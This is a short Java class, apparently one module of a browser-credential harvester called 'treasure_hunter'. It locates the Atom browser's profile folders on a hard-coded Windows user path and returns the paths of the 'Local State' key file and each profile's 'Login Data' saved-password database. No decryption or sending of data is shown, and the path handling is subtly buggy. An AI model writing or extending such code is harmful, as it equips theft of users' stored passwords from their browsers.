package com.treasure_hunter_java.browsers;

import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;

public class Atom {

    Path dirName = Path.of("C:/Users/Mikle/AppData/Local/Mail.Ru/Atom/User Data/");

    Path localStatePath = Path.of("C:/Users/Mikle/AppData/Local/Mail.Ru/Atom/User Data/Local State");

    ArrayList<Path> profiles = new ArrayList<>();

    public void collectProfiles() {

        for (int i = 1; i < 10; i++) {
            Path path = Path.of(dirName + "/Profile " + i);
            if (Files.exists(path)) {
                profiles.add(path);
            } else if (Files.exists(Path.of(dirName + "/Default"))) {
                profiles.add(Path.of(dirName + "/Default"));
            }
        }

        if (profiles.isEmpty()) {
            profiles.add(Path.of(dirName + ""));
        }

    }

    public ArrayList<Path> getProfiles() {
        return profiles;
    }

    public Path getLocalState() {

        return localStatePath;

    }

    public Path getLoginData(Path path) {

        return Path.of(path + "Login Data");

    }

}
